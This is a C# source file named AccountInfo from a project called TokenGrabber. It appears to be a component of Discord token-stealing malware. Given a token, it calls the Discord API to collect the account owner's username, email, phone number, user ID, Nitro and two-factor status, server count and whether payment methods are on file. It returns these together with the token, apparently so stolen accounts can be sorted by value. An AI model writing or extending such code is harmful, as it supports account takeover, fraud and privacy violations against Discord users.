namespace TokenGrabber.Discord;

using System.Net.Http.Headers;
using System.Text.Json;
using TokenGrabber.Models;

internal static class AccountInfo
{
    private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(10) };
    private const string ApiBase = "https://discord.com/api/v10";

    public static async Task<AccountData?> FetchAsync(string token)
    {
        var userInfo = await GetUserInfoAsync(token);
        if (userInfo is null) return null;

        var billing = await GetBillingAsync(token);
        var guilds = await GetGuildCountAsync(token);

        return new AccountData
        {
            Username = userInfo.Username,
            Discriminator = userInfo.Discriminator,
            Email = userInfo.Email,
            Phone = userInfo.Phone,
            UserId = userInfo.UserId,
            HasNitro = userInfo.PremiumType > 0,
            NitroType = userInfo.PremiumType,
            MfaEnabled = userInfo.MfaEnabled,
            GuildCount = guilds,
            HasBilling = billing,
            Token = token
        };
    }

    private static async Task<UserResponse?> GetUserInfoAsync(string token)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{ApiBase}/users/@me");
        request.Headers.Authorization = new AuthenticationHeaderValue(token);

        var response = await Http.SendAsync(request);
        if (!response.IsSuccessStatusCode) return null;

        var json = await response.Content.ReadAsStringAsync();
        var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        return new UserResponse
        {
            Username = root.GetProperty("username").GetString() ?? "",
            Discriminator = root.GetProperty("discriminator").GetString() ?? "0",
            Email = root.TryGetProperty("email", out var e) ? e.GetString() : null,
            Phone = root.TryGetProperty("phone", out var p) ? p.GetString() : null,
            UserId = root.GetProperty("id").GetString() ?? "",
            PremiumType = root.TryGetProperty("premium_type", out var pt) ? pt.GetInt32() : 0,
            MfaEnabled = root.TryGetProperty("mfa_enabled", out var mfa) && mfa.GetBoolean()
        };
    }

    private static async Task<bool> GetBillingAsync(string token)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{ApiBase}/users/@me/billing/payment-sources");
        request.Headers.Authorization = new AuthenticationHeaderValue(token);

        var response = await Http.SendAsync(request);
        if (!response.IsSuccessStatusCode) return false;

        var json = await response.Content.ReadAsStringAsync();
        var doc = JsonDocument.Parse(json);
        return doc.RootElement.GetArrayLength() > 0;
    }

    private static async Task<int> GetGuildCountAsync(string token)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, $"{ApiBase}/users/@me/guilds");
        request.Headers.Authorization = new AuthenticationHeaderValue(token);

        var response = await Http.SendAsync(request);
        if (!response.IsSuccessStatusCode) return 0;

        var json = await response.Content.ReadAsStringAsync();
        var doc = JsonDocument.Parse(json);
        return doc.RootElement.GetArrayLength();
    }

    private sealed class UserResponse
    {
        public string Username { get; init; } = "";
        public string Discriminator { get; init; } = "";
        public string? Email { get; init; }
        public string? Phone { get; init; }
        public string UserId { get; init; } = "";
        public int PremiumType { get; init; }
        public bool MfaEnabled { get; init; }
    }
}
